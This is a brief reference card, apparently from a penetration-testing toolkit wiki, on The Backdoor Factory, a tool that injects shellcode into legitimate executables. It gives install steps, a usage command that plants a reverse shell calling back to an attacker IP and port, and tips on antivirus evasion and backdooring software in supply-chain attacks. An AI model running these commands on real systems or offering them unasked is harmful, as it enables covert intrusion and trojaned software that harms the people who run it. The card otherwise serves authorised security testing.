# The Backdoor Factory

**Type:** Python Tool
**Purpose:** Patch executables with shellcode
**Platform:** Linux
**Tags:** #backdooring #shellcode #executables #post-exploitation

---

## Purpose

Backdoor Factory patches legitimate executables:
- Injects shellcode
- Maintains functionality
- Evades basic detection
- Creates backdoored binaries

---

## Installation

```bash
git clone https://github.com/secretsquirrel/the-backdoor-factory.git
cd the-backdoor-factory
pip install -r requirements.txt
```

---

## Usage

```bash
# Basic backdooring
./backdoor.py -f target.exe -s reverse_shell_tcp_inline -H 10.10.10.10 -P 4444

# Patch binary
./backdoor.py -f legitimate.exe -s <shellcode>

# Output backdoored file
```

---

## Shellcode Options

- Reverse shells
- Bind shells
- User add
- Custom shellcode

---

## Pro Tips

💡 **Binary Patching**: Injects without breaking functionality
💡 **AV Evasion**: May evade signature-based detection
💡 **Supply Chain**: Can backdoor legitimate software
💡 **Code Signing**: Breaks signatures (will need re-signing)

---

## Note

General post-exploitation tool, not Azure-specific. Included for comprehensive toolkit coverage.

---

## Resources

- GitHub: https://github.com/secretsquirrel/the-backdoor-factory
- Author: @secretsquirrel
